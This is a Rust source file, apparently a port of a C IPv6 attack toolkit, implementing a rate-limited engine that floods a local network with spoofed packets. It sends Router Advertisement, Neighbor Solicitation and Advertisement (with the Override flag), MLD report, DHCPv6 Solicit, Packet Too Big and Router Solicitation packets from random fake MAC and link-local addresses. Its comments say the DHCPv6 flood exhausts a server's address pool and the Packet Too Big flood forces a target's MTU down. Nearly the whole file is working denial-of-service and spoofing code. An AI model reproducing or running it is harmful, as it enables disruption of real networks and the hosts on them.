//! Async packet sending engine.
//!
//! Design: Template Method pattern — `flood_loop` drives every flood type.
//! Blocking C libty calls run on `spawn_blocking`; the tokio runtime stays
//! responsive.  Rate limiting uses `tokio::time::sleep` — zero busy-loops.

use std::ffi::CString;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{bail, Context, Result};
use tokio::task;
use tracing::{debug, warn};

use crate::engine::stats::Stats;
use crate::ffi;

// ── config types ──────────────────────────────────────────────────────────────

/// Shared send parameters used by the RA flood.
#[derive(Clone, Debug)]
pub struct FloodConfig {
    pub interface:   String,
    /// Packets per second (0 = unlimited)
    pub rate_pps:    u64,
    /// Total packets to send (0 = run forever)
    pub max_packets: u64,
    pub do_hop:      bool,
    pub do_frag:     u32,
    pub do_dst:      bool,
}

#[derive(Clone, Debug)]
pub struct SolicitateConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// None = random per-packet source, matching original C tool behaviour
    pub target:      Option<String>,
    pub do_alert:    bool,
}

#[derive(Clone, Debug)]
pub struct AdvertiseConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    pub target:      Option<String>,
}

#[derive(Clone, Debug)]
pub struct MldConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

#[derive(Clone, Debug)]
pub struct Dhcp6Config {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

#[derive(Clone, Debug)]
pub struct TooBigConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
    /// Target whose path MTU we want to shrink.
    pub target:      String,
}

#[derive(Clone, Debug)]
pub struct RsConfig {
    pub interface:   String,
    pub rate_pps:    u64,
    pub max_packets: u64,
}

// ── per-packet helpers ────────────────────────────────────────────────────────

/// Generate a random 6-byte fake MAC in the 00:18:xx:xx:xx:xx OUI space.
pub fn rand_fake_mac_pub() -> [u8; 6] { rand_fake_mac() }
fn rand_fake_mac() -> [u8; 6] {
    [0x00, 0x18, fastrand::u8(..), fastrand::u8(..), fastrand::u8(..), fastrand::u8(..)]
}

/// Derive an EUI-64 link-local address from a 6-byte MAC
/// (universal/local bit flipped per RFC 4291 §2.5.1).
pub fn eui64_ll_pub(mac: &[u8; 6]) -> [u8; 16] { eui64_link_local(mac) }
fn eui64_link_local(mac: &[u8; 6]) -> [u8; 16] {
    let mut ip = [0u8; 16];
    ip[0]  = 0xfe; ip[1]  = 0x80;
    ip[8]  = mac[0] ^ 0x02; ip[9]  = mac[1];
    ip[10] = mac[2];         ip[11] = 0xff;
    ip[12] = 0xfe;           ip[13] = mac[3];
    ip[14] = mac[4];         ip[15] = mac[5];
    ip
}

// ── Template Method: generic flood loop ───────────────────────────────────────

/// Drives `send_fn` in a rate-limited loop until `max_packets` is reached.
/// Exported for use by `attack.rs` which reuses the same loop mechanics.
pub async fn flood_loop_pub<F>(
    max_packets: u64,
    rate_pps:    u64,
    stats:       Arc<Stats>,
    send_fn:     F,
) -> Result<()>
where
    F: Fn() -> Result<()> + Send + Sync + 'static,
{
    flood_loop(max_packets, rate_pps, stats, send_fn).await
}

/// Drives `send_fn` in a rate-limited loop until `max_packets` is reached
/// (0 = run forever).  Each call to `send_fn` runs on a blocking thread so
/// the tokio runtime is never starved.
async fn flood_loop<F>(
    max_packets: u64,
    rate_pps:    u64,
    stats:       Arc<Stats>,
    send_fn:     F,
) -> Result<()>
where
    F: Fn() -> Result<()> + Send + Sync + 'static,
{
    let sleep_dur = rate_to_sleep(rate_pps);
    let send_fn   = Arc::new(send_fn);

    loop {
        if max_packets > 0
            && stats.sent.load(std::sync::atomic::Ordering::Relaxed) >= max_packets
        {
            break;
        }

        let f      = Arc::clone(&send_fn);
        let stats2 = Arc::clone(&stats);

        task::spawn_blocking(move || match f() {
            Ok(())  => stats2.inc_sent(),
            Err(e)  => { warn!("send error: {e}"); stats2.inc_errors(); }
        })
        .await
        .context("spawn_blocking panicked")?;

        sleep_rate(sleep_dur).await;
        log_progress(&stats);
    }

    Ok(())
}

// ── flood_router ─────────────────────────────────────────────────────────────

/// Async RA flood — replaces the original C `while(1)` busy loop.
pub async fn flood_router(cfg: FloodConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    // Resolve multicast destination once — shared across all packets.
    let (dst_raw, dstmac_raw, ip6_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::ty_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        let ip6    = ffi::ty_get_own_ipv6(iface.as_ptr(), dst, ffi::PREFER_LINK);
        if ip6.is_null() { bail!("no link-local IPv6 address on {}", cfg.interface); }
        (dst as usize, dstmac as usize, ip6 as usize)
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_ra(iface.clone(), cfg.clone(), dst_raw, dstmac_raw, ip6_raw)
    })
    .await
}

fn send_one_ra(
    iface:      CString,
    cfg:        FloodConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
    ip6_raw:    usize,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;
    let ip6    = ip6_raw    as *mut u8;

    let fake_mac = rand_fake_mac();

    let mut ra_buf = [0u8; 56];
    ra_buf[1]  = 250;
    ra_buf[5]  = 30;
    ra_buf[8]  = 5;
    ra_buf[9]  = 1;
    let mtu: u32 = 1500;
    ra_buf[12] = (mtu >> 24) as u8;
    ra_buf[13] = (mtu >> 16) as u8;
    ra_buf[14] = (mtu >>  8) as u8;
    ra_buf[15] =  mtu        as u8;
    ra_buf[16] = 3;
    ra_buf[17] = 4;
    ra_buf[18] = 64;
    ra_buf[19] = 128 + 64 + 32;
    ra_buf[20..28].fill(255);
    ra_buf[48] = 1;
    ra_buf[49] = 1;
    ra_buf[50..56].copy_from_slice(&fake_mac);

    let mut fake_mac = fake_mac; // need mut for FFI

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            ip6, dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if cfg.do_hop {
            let mut hop_buf = [0u8; 6];
            if ffi::ty_add_hdr_hopbyhop(pkt, &mut pkt_len, hop_buf.as_mut_ptr(), 6) < 0 {
                ffi::ty_destroy_packet(pkt);
                bail!("ty_add_hdr_hopbyhop failed");
            }
        }

        for i in 0..cfg.do_frag {
            let more = if i + 1 < cfg.do_frag { 1 } else { 0 };
            if ffi::ty_add_hdr_fragment(pkt, &mut pkt_len, 0, more, i) < 0 {
                ffi::ty_destroy_packet(pkt);
                bail!("ty_add_hdr_fragment failed");
            }
        }

        if cfg.do_dst {
            let mut dst_buf = [0u8; 6];
            if ffi::ty_add_hdr_dst(pkt, &mut pkt_len, dst_buf.as_mut_ptr(), 6) < 0 {
                ffi::ty_destroy_packet(pkt);
                bail!("ty_add_hdr_dst failed");
            }
        }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERADV, 0, 0xff08_ffff,
            ra_buf.as_mut_ptr(), ra_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6 failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("ty_send_pkt rc={rc}"); }
    }

    Ok(())
}

// ── flood_solicitate ─────────────────────────────────────────────────────────

/// Async Neighbor Solicitation flood.
pub async fn flood_solicitate(cfg: SolicitateConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::ty_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    let target_raw: Option<usize> = if let Some(ref t) = cfg.target {
        let cs  = CString::new(t.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {t}"); }
        Some(ptr as usize)
    } else {
        None
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_ns(iface.clone(), cfg.clone(), dst_raw, dstmac_raw, target_raw)
    })
    .await
}

fn send_one_ns(
    iface:      CString,
    cfg:        SolicitateConfig,
    dst_raw:    usize,
    dstmac_raw: usize,
    target_raw: Option<usize>,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // NS payload: [0..16] solicited addr, [16] opt=1, [17] len=1, [18..24] SLLA.
    let mut ns_buf = [0u8; 24];
    if let Some(t) = target_raw {
        unsafe { std::ptr::copy_nonoverlapping(t as *const u8, ns_buf.as_mut_ptr(), 16); }
    } else {
        ns_buf[..16].copy_from_slice(&src_ip);
    }
    ns_buf[16] = 1; ns_buf[17] = 1;
    ns_buf[18..24].copy_from_slice(&fake_mac);

    let mut alert_buf = [0u8; 6];
    if cfg.do_alert { alert_buf[0] = 5; alert_buf[1] = 2; }

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if cfg.do_alert
            && ffi::ty_add_hdr_hopbyhop(pkt, &mut pkt_len, alert_buf.as_mut_ptr(), 6) < 0
        {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_hdr_hopbyhop failed");
        }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORSOL, 0, 0,
            ns_buf.as_mut_ptr(), ns_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(NS) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send NS rc={rc}"); }
    }
    Ok(())
}

// ── flood_advertise ──────────────────────────────────────────────────────────

/// Async Neighbor Advertisement flood with Override flag.
pub async fn flood_advertise(cfg: AdvertiseConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_1 = CString::new("ff02::1").unwrap();
        let dst = ffi::ty_resolve6(ff02_1.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::1) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    let target_raw: Option<usize> = if let Some(ref t) = cfg.target {
        let cs  = CString::new(t.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {t}"); }
        Some(ptr as usize)
    } else {
        None
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_na(iface.clone(), dst_raw, dstmac_raw, target_raw)
    })
    .await
}

fn send_one_na(
    iface:      CString,
    dst_raw:    usize,
    dstmac_raw: usize,
    target_raw: Option<usize>,
) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // NA payload: [0..16] target addr, [16] opt=2 (TLLA), [17] len=1, [18..24] MAC.
    let mut na_buf = [0u8; 24];
    if let Some(t) = target_raw {
        unsafe { std::ptr::copy_nonoverlapping(t as *const u8, na_buf.as_mut_ptr(), 16); }
    } else {
        na_buf[..16].copy_from_slice(&src_ip);
    }
    na_buf[16] = 2; na_buf[17] = 1;
    na_buf[18..24].copy_from_slice(&fake_mac);

    // Override flag (bit 21 in ICMPv6 NA flags field, big-endian u32).
    const NA_OVERRIDE: u32 = 0x0200_0000;

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_NEIGHBORADV, 0, NA_OVERRIDE,
            na_buf.as_mut_ptr(), na_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(NA) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send NA rc={rc}"); }
    }
    Ok(())
}

// ── flood_mld ────────────────────────────────────────────────────────────────

/// Async MLDv1 Report flood (ICMPv6 type 131).
pub async fn flood_mld(cfg: MldConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_mld(iface.clone())
    })
    .await
}

fn send_one_mld(iface: CString) -> Result<()> {
    // Random ff02::xxxx multicast group address.
    let mut group = [0u8; 16];
    group[0] = 0xff; group[1] = 0x02;
    group[14] = fastrand::u8(..);
    group[15] = fastrand::u8(..);

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // MLDv1 Report body: 2B max-response-delay, 2B reserved, 16B multicast addr.
    let mut mld_buf = [0u8; 20];
    mld_buf[4..20].copy_from_slice(&group);

    unsafe {
        let dstmac_ptr = ffi::ty_get_multicast_mac(group.as_mut_ptr());

        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), group.as_mut_ptr(), 1, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_MLD_REPORT, 0, 0,
            mld_buf.as_mut_ptr(), mld_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(MLD) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send MLD rc={rc}"); }
    }
    Ok(())
}

// ── flood_dhcp6 ───────────────────────────────────────────────────────────────

/// Async DHCPv6 Solicit flood — exhausts server address pool.
pub async fn flood_dhcp6(cfg: Dhcp6Config, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_dhcp6(iface.clone())
    })
    .await
}

fn send_one_dhcp6(iface: CString) -> Result<()> {
    // ff02::1:2 — all-DHCP-servers-and-relay-agents multicast.
    let mut dst = [0u8; 16];
    dst[0] = 0xff; dst[1] = 0x02; dst[13] = 0x01; dst[15] = 0x02;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // DHCPv6 Solicit: msg-type=1, random 3B transaction-id,
    // then Client Identifier option (DUID-LL, random per packet).
    let mut payload = [0u8; 4 + 2 + 2 + 2 + 2 + 6]; // = 18 bytes
    payload[0] = 1;                    // msg-type: Solicit
    payload[1] = fastrand::u8(..);     // transaction-id[0]
    payload[2] = fastrand::u8(..);     // transaction-id[1]
    payload[3] = fastrand::u8(..);     // transaction-id[2]
    payload[4] = 0; payload[5] = 1;    // option-code = 1 (Client ID)
    payload[6] = 0; payload[7] = 10;   // option-len  = 10
    payload[8] = 0; payload[9] = 3;    // DUID-type = 3 (LL)
    payload[10] = 0; payload[11] = 1;  // hw-type = 1 (Ethernet)
    for b in &mut payload[12..18] { *b = fastrand::u8(..); }

    unsafe {
        let dstmac_ptr = ffi::ty_get_multicast_mac(dst.as_mut_ptr());

        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst.as_mut_ptr(), 1, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_udp(
            pkt, &mut pkt_len, 546, 547, 0,
            payload.as_mut_ptr(), payload.len() as i32,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_udp failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send DHCPv6 rc={rc}"); }
    }
    Ok(())
}

// ── flood_toobig ─────────────────────────────────────────────────────────────

/// Async ICMPv6 Packet Too Big flood — forces target MTU to 1280.
pub async fn flood_toobig(cfg: TooBigConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let target_raw: usize = {
        let cs  = CString::new(cfg.target.as_str()).context("null in target")?;
        let ptr = unsafe { ffi::ty_resolve6(cs.as_ptr()) };
        if ptr.is_null() { bail!("cannot resolve target {}", cfg.target); }
        ptr as usize
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_toobig(iface.clone(), target_raw)
    })
    .await
}

fn send_one_toobig(iface: CString, target_raw: usize) -> Result<()> {
    let dst = target_raw as *mut u8;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // PTB body: 4B MTU field + 40B fake invoking IPv6 header (version=6, rest zeros).
    const MTU: u32 = 1280;
    let mut ptb_buf = [0u8; 44];
    ptb_buf[0] = (MTU >> 24) as u8;
    ptb_buf[1] = (MTU >> 16) as u8;
    ptb_buf[2] = (MTU >>  8) as u8;
    ptb_buf[3] =  MTU        as u8;
    ptb_buf[4] = 0x60; // version=6

    unsafe {
        let dstmac_ptr = ffi::ty_get_mac(iface.as_ptr(), src_ip.as_mut_ptr(), dst);

        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_TOOBIG, 0, 0,
            ptb_buf.as_mut_ptr(), ptb_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(TooBig) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac_ptr, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send TooBig rc={rc}"); }
    }
    Ok(())
}

// ── flood_rs ─────────────────────────────────────────────────────────────────

/// Async Router Solicitation flood (ICMPv6 type 133).
///
/// Sends RS to ff02::2 (all-routers); forces routers to emit unsolicited RAs.
pub async fn flood_rs(cfg: RsConfig, stats: Arc<Stats>) -> Result<()> {
    let iface = CString::new(cfg.interface.clone())
        .context("interface name contains null byte")?;

    let (dst_raw, dstmac_raw) = unsafe {
        let ff02_2 = CString::new("ff02::2").unwrap();
        let dst = ffi::ty_resolve6(ff02_2.as_ptr());
        if dst.is_null() { bail!("ty_resolve6(ff02::2) failed"); }
        let dstmac = ffi::ty_get_multicast_mac(dst);
        (dst as usize, dstmac as usize)
    };

    flood_loop(cfg.max_packets, cfg.rate_pps, stats, move || {
        send_one_rs(iface.clone(), dst_raw, dstmac_raw)
    })
    .await
}

fn send_one_rs(iface: CString, dst_raw: usize, dstmac_raw: usize) -> Result<()> {
    let dst    = dst_raw    as *mut u8;
    let dstmac = dstmac_raw as *mut u8;

    let fake_mac = rand_fake_mac();
    let src_ip   = eui64_link_local(&fake_mac);
    let mut fake_mac = fake_mac;
    let mut src_ip   = src_ip;

    // RS body: 4B reserved, then Source Link-Layer Address option (type=1, len=1, 6B MAC).
    let mut rs_buf = [0u8; 10];
    rs_buf[4] = 1; rs_buf[5] = 1;
    rs_buf[6..10].copy_from_slice(&fake_mac[0..4]);

    unsafe {
        let mut pkt_len: i32 = 0;
        let pkt = ffi::ty_create_ipv6(
            iface.as_ptr(), ffi::PREFER_LINK, &mut pkt_len,
            src_ip.as_mut_ptr(), dst, 255, 0, 0, 0, 0,
        );
        if pkt.is_null() { bail!("ty_create_ipv6 failed"); }

        if ffi::ty_add_icmp6(
            pkt, &mut pkt_len, ffi::ICMP6_ROUTERSOL, 0, 0,
            rs_buf.as_mut_ptr(), rs_buf.len() as i32, 0,
        ) < 0 {
            ffi::ty_destroy_packet(pkt);
            bail!("ty_add_icmp6(RS) failed");
        }

        let rc = ffi::ty_send_pkt(
            iface.as_ptr(), fake_mac.as_mut_ptr(), dstmac, pkt, &mut pkt_len,
        );
        ffi::ty_destroy_packet(pkt);
        if rc < 0 { bail!("send RS rc={rc}"); }
    }
    Ok(())
}

// ── private helpers ───────────────────────────────────────────────────────────

fn rate_to_sleep(rate_pps: u64) -> Duration {
    1_000_000u64
        .checked_div(rate_pps)
        .map(Duration::from_micros)
        .unwrap_or(Duration::ZERO)
}

async fn sleep_rate(d: Duration) {
    if !d.is_zero() { tokio::time::sleep(d).await; }
}

fn log_progress(stats: &Stats) {
    let (sent, errors, elapsed) = stats.snapshot();
    if sent > 0 && sent % 1000 == 0 {
        debug!(sent, errors, elapsed_s = elapsed, pps = stats.pps() as u64, "progress");
    }
}
